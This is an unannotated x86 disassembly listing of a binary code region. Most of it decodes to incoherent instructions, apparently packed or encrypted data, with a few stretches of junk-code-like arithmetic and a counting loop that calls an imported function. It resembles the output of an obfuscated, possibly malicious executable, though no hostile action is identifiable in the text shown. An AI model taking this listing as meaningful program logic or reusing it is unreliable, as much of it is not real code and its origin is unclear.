  407aef:	stos   BYTE PTR es:[edi],al
  407af0:	jl     0x407afc
  407af2:	popf   
  407af3:	sbb    eax,0x2fe7c43
  407af8:	push   esi
  407af9:	dec    ebp
  407afa:	pop    esi
  407afb:	or     bl,BYTE PTR [edi-0x73]
  407afe:	ins    BYTE PTR es:[edi],dx
  407aff:	mov    edi,0x5b866d44
  407b04:	lahf   
  407b05:	test   eax,0xa774eb69
  407b0a:	popa   
  407b0b:	sahf   
  407b0c:	dec    esi
  407b0d:	mov    bh,0x63
  407b0f:	adc    eax,DWORD PTR [edi+0x6d796e3]
  407b15:	imul   esi,DWORD PTR [ebx-0x42ca5c9e],0xffffffe1
  407b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b1d:	test   BYTE PTR [eax-0x38],dh
  407b20:	and    eax,0xadfe0d72
  407b25:	pop    es
  407b26:	imul   eax,ecx,0xd5541ba0
  407b2c:	push   eax
  407b2d:	std    
  407b2e:	cmp    ecx,eax
  407b30:	jne    0x407efc
  407b36:	mov    ax,WORD PTR [ebp-0x8]
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433723,0x433767
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433803,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43372b,0x433827
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x43383b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4337fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0x2ff6a3a4,al
  407ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ba9:	and    DWORD PTR [ecx],eax
  407bab:	js     0x407b78
  407bad:	jle    0x407c2d
  407baf:	and    BYTE PTR [ebp+0x7e],bh
  407bb2:	jle    0x407b3a
  407bb4:	push   ds
  407bb5:	sbb    DWORD PTR [esi-0x67],esp
  407bb8:	adc    al,0x62
  407bba:	loopne 0x407b99
  407bbc:	jmp    0x407c3c
  407bbe:	add    eax,0xf2c54d5d
  407bc3:	sbb    al,0x1b
  407bc5:	sbb    ecx,0x5d407b5e
  407bcb:	(bad)  
  407bcc:	mov    eax,DWORD PTR [ecx-0x225ac4d1]
  407bd2:	xor    DWORD PTR [ebp-0x1b],ebx
  407bd5:	push   esp
  407bd6:	popa   
  407bd7:	pop    eax
  407bd8:	mov    edx,0x6b363e30
  407bdd:	push   cs
  407bde:	cmp    BYTE PTR [edx-0x27],cl
  407be1:	and    BYTE PTR [edi],ah
  407be3:	mov    dl,0x30
  407be5:	mov    ah,0xef
  407be7:	sbb    eax,0xe8ddf11e
  407bec:	adc    BYTE PTR [edx],0xd
  407bef:	adc    ecx,ecx
  407bf1:	push   0x21
  407bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bf4:	mul    DWORD PTR [edx]
  407bf6:	fild   WORD PTR [edi+0x3a]
  407bf9:	or     al,0xd2
  407bfb:	sahf   
  407bfc:	aaa    
  407bfd:	pop    ecx
  407bfe:	adc    cl,ch
  407c00:	pop    edx
  407c01:	fdiv   QWORD PTR [esi-0x5e]
  407c04:	daa    
  407c05:	mov    ds:0x63f0d88a,eax
  407c0a:	cmp    DWORD PTR [ebx],eax
  407c0c:	inc    edx
  407c0d:	and    DWORD PTR [eax-0x699bfb14],edi
  407c13:	fsubr  DWORD PTR [edi]
  407c15:	retf   0x25de
  407c18:	imul   edi,DWORD PTR [esi-0x6fd7e0ad],0xffffff94
  407c1f:	add    eax,0x200cf3aa
  407c24:	leave  
  407c25:	call   0x42c496a8
  407c2a:	scas   al,BYTE PTR es:[edi]
  407c2b:	lahf   
  407c2c:	retf   
  407c2d:	fs scas al,BYTE PTR es:[edi]
  407c2f:	nop
  407c30:	jg     0x407c97
  407c32:	(bad)  
  407c33:	mov    esp,0x17b7ee70
  407c38:	push   0xffffffa5
  407c3a:	je     0x407bff
  407c3c:	jno    0x407c4b
  407c3e:	rol    DWORD PTR [edi+0x39a198e4],1
  407c44:	push   es
  407c45:	call   0x6934f27d
  407c4a:	emms   
  407c4c:	jmp    FWORD PTR [ebx-0x594919ea]
  407c52:	xchg   ecx,edi
  407c54:	xlat   BYTE PTR ds:[ebx]
  407c55:	outs   dx,DWORD PTR ds:[esi]
  407c56:	jb     0x407bf6
  407c58:	adc    eax,0xb5d8d25f
  407c5d:	jl     0x407c93
  407c5f:	lods   eax,DWORD PTR ds:[esi]
  407c60:	adc    al,0x7f
  407c62:	inc    edx
  407c63:	mov    esi,0x347eee00
  407c68:	(bad)  
  407c6a:	repnz mov ebp,0x6d7b37f8
  407c70:	inc    edi
  407c71:	das    
  407c72:	test   al,0xb9
  407c74:	sbb    eax,0x366ed5f9
  407c79:	mov    ebx,0x9c93fc0a
  407c7e:	jbe    0x407cbf
  407c80:	mov    ds:0x45e0a4af,eax
  407c85:	mov    edi,0x4a4b1840
  407c8a:	cmp    esp,DWORD PTR [edi-0x35]
  407c8d:	aad    0x4a
  407c8f:	and    al,BYTE PTR [edx+0x6c]
  407c92:	ds ret 
  407c94:	rcr    DWORD PTR [ebx],cl
  407c96:	sbb    BYTE PTR [esi+0xdbb3ddc],ch
  407c9c:	and    edx,edx
  407c9e:	lods   al,BYTE PTR ds:[esi]
  407c9f:	add    dl,BYTE PTR [edx+0x67a4c742]
  407ca5:	mov    dh,0xac
  407ca7:	stc    
  407ca8:	inc    ebp
  407ca9:	jae    0x407cc7
  407cab:	aaa    
  407cac:	call   0x7e9f358d
  407cb1:	mov    ds:0x20c25b5e,al
  407cb6:	les    eax,FWORD PTR [ecx-0x6d]
  407cb9:	add    DWORD PTR ds:0x7a94b071,esi
  407cbf:	wrmsr  
  407cc1:	test   al,0xe1
  407cc3:	xor    bl,BYTE PTR [ecx-0x5428714b]
  407cc9:	mov    edx,0xd274395
  407cce:	sbb    eax,0x69785bc4
  407cd3:	push   edi
  407cd4:	rol    DWORD PTR [ecx+0x36c61ab4],cl
  407cda:	mov    cs,WORD PTR ds:0xa102a9c1
  407ce0:	aaa    
  407ce1:	mov    bl,0x84
  407ce3:	jo     0x407d5e
  407ce5:	jp     0x407d47
  407ce7:	ret    0x91fd
  407cea:	adc    esp,DWORD PTR [esp+edx*1+0x7e042da4]
  407cf1:	xor    eax,DWORD PTR [edi+eax*2+0x9]
  407cf5:	dec    ebp
  407cf6:	imul   esi,DWORD PTR [ebx-0x5d],0xffffffc8
  407cfa:	call   0x3cc1:0xf5ee2d70
  407d01:	sbb    DWORD PTR [ebp-0x75468f9c],esp
  407d07:	sbb    al,0x2f
  407d09:	scas   al,BYTE PTR es:[edi]
  407d0a:	into   
  407d0b:	repz jmp 0xda26:0xca6d9619
  407d13:	push   esp
  407d14:	jp     0x407d4b
  407d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d17:	pop    esi
  407d18:	and    BYTE PTR [edx+0x754dc93d],dl
  407d1e:	inc    ecx
  407d1f:	ja     0x407d37
  407d21:	fidiv  DWORD PTR [edi+0x5b]
  407d24:	fcmovnu st,st(6)
  407d26:	ins    BYTE PTR es:[edi],dx
  407d27:	mov    edi,ebp
  407d29:	adc    edx,esp
  407d2b:	ins    DWORD PTR es:[edi],dx
  407d2c:	cmp    ebx,edi
  407d2e:	mov    edx,DWORD PTR [ebp+0x21]
  407d31:	scas   eax,DWORD PTR es:[edi]
  407d32:	in     al,0xb3
  407d34:	pop    ecx
  407d35:	retf   0x3edd
  407d38:	sahf   
  407d39:	scas   al,BYTE PTR es:[edi]
  407d3a:	mov    esp,0x5770a2fc
  407d3f:	mov    ebx,0xae47d4fe
  407d44:	sub    al,0xdf
  407d46:	xchg   esi,eax
  407d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d48:	sub    ecx,DWORD PTR [ebp+0x46]
  407d4b:	rcr    BYTE PTR [esi+0x40],cl
  407d4e:	push   ecx
  407d4f:	cmp    BYTE PTR [ecx],bl
  407d51:	jl     0x407d59
  407d53:	aam    0x1b
  407d55:	and    al,0x7f
  407d57:	push   esi
  407d58:	cwde   
  407d59:	shr    DWORD PTR [edi+0x4b],1
  407d5c:	repnz pop edx
  407d5e:	cs push cs
  407d60:	lahf   
  407d61:	sub    BYTE PTR [esi-0x2b],dh
  407d64:	fs xor eax,0xd28c14d4
  407d6a:	pusha  
  407d6b:	cmp    dh,cl
  407d6d:	cli    
  407d6e:	stos   DWORD PTR es:[edi],eax
  407d6f:	mov    bl,0xc9
  407d71:	imul   ebp,DWORD PTR [esi+0x6128148b],0x4c581cdb
  407d7b:	stos   BYTE PTR es:[edi],al
  407d7c:	gs and al,ah
  407d7f:	add    DWORD PTR [edx+0x6d],ebx
  407d82:	xchg   DWORD PTR [ebx],ebp
  407d84:	mov    eax,ds:0x9e52a556
  407d89:	stc    
  407d8a:	es mov cl,0x1e
  407d8d:	sbb    BYTE PTR [esi+0x36],al
  407d90:	dec    eax
  407d91:	ror    DWORD PTR [eax-0x621815d0],0xeb
  407d98:	sub    DWORD PTR [ebp-0x2bd747ff],ebp
  407d9e:	xchg   esp,eax
  407d9f:	aas    
  407da0:	test   al,0x87
  407da2:	into   
  407da3:	mov    ebp,0xa16b8c80
  407da8:	and    eax,0xc7350925
  407dad:	mov    ds:0xb05d9a88,eax
  407db2:	and    al,0xed
  407db4:	sahf   
  407db5:	out    0x52,al
  407db7:	fimul  WORD PTR [esi+0x72]
  407dba:	(bad)  
  407dbb:	shl    DWORD PTR ds:0x349f40a0,0x5f
  407dc2:	jmp    0xa4c597b0
  407dc7:	es mov bl,0xef
  407dca:	cmp    bh,dl
  407dcc:	ret    
  407dcd:	gs pop edi
  407dcf:	or     BYTE PTR [esi],dl
  407dd1:	fild   WORD PTR [eax-0x3]
  407dd4:	mov    ecx,0xfecd4b75
  407dd9:	in     al,dx
  407dda:	mov    esi,0x43e5e125
  407ddf:	jns    0x407d85
  407de1:	stos   BYTE PTR es:[edi],al
  407de2:	mov    esi,0xb225758a
  407de7:	mov    dh,0xf3
  407de9:	das    
  407dea:	cdq    
  407deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dec:	fwait
  407ded:	inc    ecx
  407dee:	jge    0x407e3f
  407df0:	sbb    al,0xa1
  407df2:	icebp  
  407df3:	mov    BYTE PTR [esi-0x7fb100e7],ah
  407df9:	xor    ebp,esi
  407dfb:	dec    esi
  407dfc:	hlt    
  407dfd:	mov    eax,ds:0xdc9908d
  407e02:	mov    al,0x2d
  407e04:	mov    dh,0xd4
  407e06:	test   BYTE PTR [esi-0x6c],bh
  407e09:	aaa    
  407e0a:	jb     0x407ddf
  407e0c:	iret   
  407e0d:	gs pusha 
  407e0f:	mov    DWORD PTR [ebx+0xf],ebp
  407e12:	bts    DWORD PTR [ebp+0x76],eax
  407e16:	or     ah,bl
  407e18:	loopne 0x407e01
  407e1a:	cmp    edi,ebp
  407e1c:	cmp    BYTE PTR [ecx-0x55],cl
  407e1f:	sub    eax,DWORD PTR ss:[edi]
  407e22:	sti    
  407e23:	mov    cl,0xad
  407e25:	jle    0x407e1c
  407e27:	cmp    esi,DWORD PTR [ebx-0x7e]
  407e2a:	into   
  407e2b:	and    ebp,ebp
  407e2d:	sbb    BYTE PTR [ecx-0x2a1ff0e5],al
  407e33:	mov    ds:0x27de9616,al
  407e38:	sbb    al,0x15
  407e3a:	mov    bl,0xf6
  407e3c:	shl    DWORD PTR [eax-0x5c],1
  407e3f:	add    eax,0x70c0e548
  407e44:	(bad)  
  407e45:	jmp    0x8c1b:0x60a6e290
  407e4c:	(bad)  
  407e4d:	xor    BYTE PTR [edi],bh
  407e4f:	add    eax,edx
  407e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e52:	mov    ch,dh
  407e54:	repnz lahf 
  407e56:	jmp    0xc2f5:0x5b24d3a8
  407e5d:	dec    eax
  407e5e:	adc    bl,bl
  407e60:	xlat   BYTE PTR ds:[ebx]
  407e61:	test   BYTE PTR [eax+0x6e30d4c9],0xa6
  407e68:	test   BYTE PTR [edi-0xa],bl
  407e6b:	stos   BYTE PTR es:[edi],al
  407e6c:	and    al,0x88
  407e6e:	(bad)  
  407e6f:	sbb    esi,DWORD PTR [eax-0x1f]
  407e72:	enter  0x5a92,0xe0
  407e76:	sbb    eax,0xc299cde
  407e7b:	sti    
  407e7c:	inc    esi
  407e7d:	lea    esi,[ecx-0x65f4b274]
  407e83:	mov    cl,BYTE PTR ds:0x5b5119f5
  407e89:	in     eax,0x23
  407e8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e8c:	inc    edx
  407e8d:	add    esi,DWORD PTR [esi-0xd]
  407e90:	fstp   TBYTE PTR [edi-0x52]
  407e93:	push   ds
  407e94:	push   ecx
  407e95:	adc    ch,dh
  407e97:	push   0xffffffe7
  407e99:	fwait
  407e9a:	xchg   edx,eax
  407e9b:	jp     0x407ec0
  407e9d:	rcr    DWORD PTR [ebx+0x21],1
  407ea0:	push   edx
  407ea1:	out    dx,eax
  407ea2:	iret   
  407ea3:	ins    BYTE PTR es:[edi],dx
  407ea4:	fld    DWORD PTR [eax]
  407ea6:	fldcw  WORD PTR [eax]
  407ea8:	xor    ch,al
  407eaa:	dec    edi
  407eab:	sbb    DWORD PTR [edx],0x61
  407eae:	jp     0x407e65
  407eb0:	pusha  
  407eb1:	imul   ebx,DWORD PTR [edi],0x45889b8f
  407eb7:	inc    eax
  407eb8:	inc    esp
  407eb9:	xor    al,0xfc
  407ebb:	sbb    al,0xc3
  407ebd:	pop    ecx
  407ebe:	test   eax,0xdf52b5e6
  407ec3:	push   es
  407ec4:	sub    al,0x2c
  407ec6:	xchg   esp,eax
  407ec7:	sbb    ecx,DWORD PTR ds:0xfa51f31c
  407ecd:	arpl   WORD PTR [esi],dx
  407ecf:	add    DWORD PTR [edi-0x519d1322],edi
  407ed5:	pop    esi
  407ed6:	cmp    al,0x88
  407ed8:	mov    edi,esi
  407eda:	cmp    BYTE PTR [ecx+0x2b],al
  407edd:	aaa    
  407ede:	ffree  st(4)
  407ee0:	je     0x407e63
  407ee2:	jne    0x407ee0
  407ee4:	mov    eax,0x660e149e
  407ee9:	mov    eax,DWORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43376f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	jnp    0x407ebf
  407f1f:	stos   BYTE PTR es:[edi],al
  407f20:	in     al,dx
  407f21:	sub    dl,dh
  407f23:	jle    0x407fa3
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	xchg   edi,eax
  407f2a:	cmp    dl,BYTE PTR [ebx+0x7a420542]
  407f30:	push   0x5d07582d
  407f35:	sti    
  407f36:	les    esp,FWORD PTR [eax-0x40]
  407f39:	jmp    0x407f5f
  407f3b:	daa    
  407f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f3d:	mov    ebp,0xe5474d32
  407f42:	mov    dl,0x64
  407f44:	sbb    ecx,0x9103908d
  407f4a:	push   ds
  407f4b:	aaa    
  407f4c:	cmp    ebp,edi
  407f4e:	or     al,BYTE PTR [edi]
  407f50:	mov    edx,ds
  407f52:	ins    DWORD PTR es:[edi],dx
  407f53:	test   BYTE PTR [esp+ecx*1+0x33],cl
  407f57:	mov    edi,0xf46cee26
  407f5c:	and    BYTE PTR [ecx-0x80a0768],0x5e
  407f63:	pop    es
  407f64:	xor    eax,0x2f65112a
  407f69:	cmpps  xmm0,XMMWORD PTR [eax],0x11
  407f6d:	cmp    ecx,DWORD PTR [esi+edi*2+0xa]
  407f71:	repnz mov dh,BYTE PTR [esi]
  407f74:	cli    
  407f75:	cmp    al,0x3c
  407f77:	hlt    
  407f78:	inc    edi
  407f79:	adc    esi,esp
  407f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f7c:	stos   BYTE PTR es:[edi],al
  407f7d:	sub    al,0x9e
  407f7f:	retf   
  407f80:	out    0x58,al
  407f82:	outs   dx,DWORD PTR ds:[esi]
  407f83:	xlat   BYTE PTR ds:[ebx]
  407f84:	adc    edi,DWORD PTR [ebx-0x6b]
  407f87:	xchg   DWORD PTR [esi+ebp*4-0xd],ebx
  407f8b:	mov    ah,0x39
  407f8d:	mov    bl,0x2
  407f8f:	lds    edi,FWORD PTR [edx-0x1001bca4]
  407f95:	sti    
  407f96:	push   es
  407f97:	add    al,0xc8
  407f99:	out    dx,al
  407f9a:	jo     0x407ffe
  407f9c:	xchg   ebp,eax
  407f9d:	pop    ss
  407f9e:	jg     0x407f60
  407fa0:	add    ch,BYTE PTR [ecx-0x1ca3c8a3]
  407fa6:	dec    esp
  407fa7:	fdivrp st(1),st
  407fa9:	dec    ecx
  407faa:	in     eax,0x4e
  407fac:	scas   eax,DWORD PTR es:[edi]
  407fad:	jnp    0x407fa1
  407faf:	idiv   DWORD PTR [edx]
  407fb1:	mov    edi,0xf5a937ab
  407fb6:	add    DWORD PTR ds:0xeeb220d4,ecx
  407fbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fbd:	inc    esp
  407fbe:	(bad)  [ecx-0x3659e1b9]
  407fc4:	pop    edx
  407fc5:	test   eax,0xda919600
  407fca:	pop    edi
  407fcb:	div    BYTE PTR [esp+edi*2+0x62bfcdfc]
  407fd2:	imul   edi,edx,0xffffff8b
  407fd5:	xor    eax,0xbac16073
  407fda:	jne    0x407f93
  407fdc:	sub    al,0xae
  407fde:	in     eax,0x86
  407fe0:	arpl   WORD PTR [ebx],bp
  407fe2:	mov    cl,0x61
  407fe4:	dec    eax
  407fe5:	mov    ch,0x99
  407fe7:	sahf   
  407fe8:	jge    0x408015
  407fea:	stc    
  407feb:	inc    edx
  407fec:	out    0x26,al
  407fee:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ff0:	loop   0x407f97
  407ff2:	or     eax,0xb7141648
  407ff7:	jae    0x407fd1
  407ff9:	lods   eax,DWORD PTR ds:[esi]
  407ffa:	jg     0x408052
  407ffc:	or     edi,DWORD PTR [ebx+0x679518c6]
  408002:	js     0x40800a
  408004:	jns    0x407ff4
  408006:	cdq    
  408007:	inc    eax
  408008:	rol    DWORD PTR [esi+0x5da96e43],0x94
  40800f:	ins    DWORD PTR es:[edi],dx
  408010:	addr16 push edx
  408012:	xchg   ecx,eax
  408013:	cld    
  408014:	in     eax,0x27
  408016:	das    
  408017:	daa    
  408018:	xor    al,0xda
  40801a:	call   0xa678116f
  40801f:	popf   
  408020:	pusha  
  408021:	sbb    ebp,DWORD PTR [ebx-0x37ef7520]
  408027:	popa   
  408028:	scas   al,BYTE PTR es:[edi]
  408029:	lods   al,BYTE PTR ds:[esi]
  40802a:	out    0x95,al
  40802c:	mov    edx,gs
  40802e:	ins    DWORD PTR es:[edi],dx
  40802f:	js     0x407fd4
  408031:	and    ch,BYTE PTR [edx]
  408033:	iret   
  408034:	mov    ?,WORD PTR [ecx-0x38147ea8]
  40803a:	mov    BYTE PTR [eax+eax*1],al
  40803d:	call   0x1996:0x8e12bb10
  408044:	rcr    al,cl
  408046:	cdq    
  408047:	cmp    BYTE PTR [edi+0x19],dl
  40804a:	cmp    edx,DWORD PTR [edi+0x2e3b6a80]
  408050:	mov    eax,0x5ad4b9ba
  408055:	shl    BYTE PTR [edi],cl
  408057:	mov    ebx,0x8d72e960
  40805c:	lea    eax,[ecx+eiz*4+0x6c964d05]
  408063:	out    dx,eax
  408064:	sub    BYTE PTR [eax+0x30b88a8],cl
  40806a:	es xchg esp,eax
  40806c:	(bad)  [ebx]
  40806e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40806f:	imul   ebx,edx,0x73
  408072:	or     eax,DWORD PTR [ecx+0x42]
  408075:	adc    DWORD PTR [ebx+0x36ac76c8],0x7e
  40807c:	lock test al,0xf
  40807f:	mov    dh,0x4a
  408081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408082:	retf   0xeeb7
  408085:	out    0x85,al
  408087:	add    BYTE PTR [edx-0x2330abe2],0xdc
  40808e:	adc    DWORD PTR [ebx-0x6a],0x45c7a5f0
  408095:	clc    
  408096:	xor    al,BYTE PTR [ebp-0x38be0764]
  40809c:	inc    ebp
  40809d:	in     al,dx
  40809e:	xor    DWORD PTR [ebp+0x77b8f89c],eax
  4080a4:	xchg   ebp,eax
  4080a5:	add    BYTE PTR [eax],al
  4080a7:	mov    ecx,DWORD PTR ds:0x433727
  4080ad:	xor    DWORD PTR ds:0x433833,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433837
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4337fb
  4080d7:	add    ecx,DWORD PTR ds:0x43371b
  4080dd:	mov    DWORD PTR ds:0x4337fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433767,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433783,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43371f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4337b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4337b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4337b3,eax
  408121:	cmp    DWORD PTR ds:0x4337b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4337b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4337b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4337b3
  408158:	inc    eax
  408159:	mov    ds:0x4337b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43376b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0x392a1e8b
  40818c:	hlt    
  40818d:	nop
  40818e:	xlat   BYTE PTR ds:[ebx]
  40818f:	jle    0x40820f
  408191:	in     al,0x7f
  408193:	jle    0x408213
  408195:	inc    ecx
  408196:	inc    edi
  408197:	ret    
  408198:	rsm    
  40819a:	add    DWORD PTR [ebx-0x3],ebx
  40819d:	and    ebp,esi
  40819f:	aad    0x6f
  4081a1:	xor    al,0xa6
  4081a3:	(bad)  [edi+edx*2]
  4081a6:	xchg   ebx,eax
  4081a7:	outs   dx,BYTE PTR ds:[esi]
  4081a8:	pop    ss
  4081a9:	les    ebx,FWORD PTR [ebx+0x1432b71f]
  4081af:	lods   al,BYTE PTR ds:[esi]
  4081b0:	(bad)  
  4081b1:	rol    DWORD PTR [ebp-0x4eedf1f1],1
  4081b7:	mov    ch,ch
  4081b9:	xchg   ebx,eax
  4081ba:	pop    es
  4081bb:	jmp    0x40822d
  4081bd:	retf   
  4081be:	xor    ecx,edx
  4081c0:	and    eax,0xcf50068
  4081c5:	push   edi
  4081c6:	imul   ecx,edi,0x3fea2c16
  4081cc:	retf   
  4081cd:	test   DWORD PTR [eax-0x43e1c1e9],edx
  4081d3:	ins    DWORD PTR es:[edi],dx
  4081d4:	xchg   edi,eax
  4081d5:	shr    DWORD PTR [eax+0x18f4f322],1
  4081db:	lahf   
  4081dc:	dec    esp
  4081dd:	nop
  4081de:	add    ebx,esi
  4081e0:	loop   0x408179
  4081e2:	jmp    0x40820f
  4081e4:	xor    edx,DWORD PTR [ecx*8-0x4262f415]
  4081eb:	jle    0x408189
  4081ed:	dec    esp
  4081ee:	pop    edi
  4081ef:	xchg   esp,eax
  4081f0:	jl     0x408198
  4081f2:	sbb    cl,BYTE PTR [ebx+0x1c]
  4081f5:	rol    bh,cl
  4081f7:	mov    edi,0x140f875a
  4081fc:	xor    ebp,DWORD PTR [ebp-0x172a3e68]
  408202:	cdq    
  408203:	dec    ecx
  408204:	sbb    al,0xe8
  408206:	xchg   edi,eax
  408207:	cmc    
  408208:	cmp    al,0x46
  40820a:	dec    edi
  40820b:	cmp    eax,0x853f9afe
  408210:	push   ebx
  408211:	mov    WORD PTR [eax+0x7d],fs
  408214:	adc    eax,0xf75b0bc8
  408219:	cli    
  40821a:	sbb    dl,BYTE PTR [esi]
  40821c:	or     BYTE PTR [ebx+0x39],cl
  40821f:	push   edx
  408220:	pop    esp
  408221:	dec    esi
  408222:	mov    al,ds:0xe2b2d00c
  408227:	rcr    DWORD PTR [ecx],1
  408229:	sub    eax,0x404abde4
  40822e:	jb     0x4081f7
  408230:	adc    eax,0x947094b5
  408235:	xchg   esi,eax
  408236:	test   eax,0x467c0685
  40823b:	inc    ebp
  40823c:	vcvtss2sd xmm0,xmm1,DWORD PTR ds:[edx]
  408241:	or     DWORD PTR [ecx+0x2d7cfc0b],0xffffffaa
  408248:	sahf   
  408249:	add    cl,dh
  40824b:	mov    al,ds:0x698b687a
  408250:	jge    0x4082bd
  408252:	rol    BYTE PTR [esi],1
  408254:	addr16 retf 
  408256:	sub    bh,ah
  408258:	ret    0x5ff5
  40825b:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40825d:	mul    bl
  40825f:	retf   0x9fe2
  408262:	jb     0x408282
  408264:	pop    ss
  408265:	sar    BYTE PTR [edi],1
  408267:	mov    edi,0xe4f37aa1
  40826c:	and    al,0xc8
  40826e:	jmp    0xcdbaa8b1
  408273:	push   0x53
  408275:	push   cs
  408276:	jbe    0x4082e7
  408278:	scas   eax,DWORD PTR es:[edi]
  408279:	dec    esp
  40827a:	icebp  
  40827b:	in     al,0x97
  40827d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40827e:	data16 and BYTE PTR [eax+0x3b14d1cd],0xf1
  408286:	jne    0x4082b9
  408288:	fadd   QWORD PTR [ebx-0x1c]
  40828b:	jne    0x408245
  40828d:	mov    dh,0xcb
  40828f:	not    BYTE PTR [ebx+esi*1+0x107331]
  408296:	adc    dh,dh
  408298:	xor    eax,0x668477b7
  40829d:	xchg   ecx,eax
  40829e:	das    
  40829f:	xor    BYTE PTR [ecx-0x46],0x4f
  4082a3:	push   ebx
  4082a4:	cld    
  4082a5:	fidivr DWORD PTR [ebx+0x172fd53a]
  4082ab:	push   ebp
  4082ac:	mov    ebp,0xdb298a7b
  4082b1:	add    al,0xf
  4082b3:	lods   al,BYTE PTR ds:[esi]
  4082b4:	ja     0x4082af
  4082b6:	cld    
  4082b7:	add    DWORD PTR [eax+0x454feb3a],eax
  4082bd:	sub    ebp,DWORD PTR ds:0xbac4229b
  4082c3:	mov    BYTE PTR [esi+0x39bca490],al
  4082c9:	push   0xffffff85
  4082cb:	xchg   ebp,eax
  4082cc:	(bad)  
  4082cd:	xor    edx,DWORD PTR [edi+esi*4-0x2de0198]
  4082d4:	xchg   esi,eax
  4082d5:	xor    eax,0x81c9a2d9
  4082da:	lea    edi,[eax+0x1]
  4082dd:	push   esi
  4082de:	jge    0x40829b
  4082e0:	lods   al,BYTE PTR ds:[esi]
  4082e1:	and    al,0x3f
  4082e3:	inc    ebx
  4082e4:	outs   dx,BYTE PTR ds:[esi]
  4082e5:	adc    DWORD PTR [ebp+0x6d],esp
  4082e8:	mov    dl,0x28
  4082ea:	jb     0x408281
  4082ec:	xchg   ecx,eax
  4082ed:	sahf   
  4082ee:	(bad)  
  4082ef:	sti    
  4082f0:	jo     0x408309
  4082f2:	or     DWORD PTR [edx],ebp
  4082f4:	fidivr DWORD PTR [edi+0x3edc19d3]
  4082fa:	dec    esi
  4082fb:	and    dl,al
  4082fd:	gs sub eax,0x2581c133
  408303:	jg     0x40833c
  408305:	inc    ebx
  408306:	add    BYTE PTR [eax+0x13],dh
  408309:	add    BYTE PTR [eax],al
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433723,0x35ec
  40831a:	xor    ebx,ecx
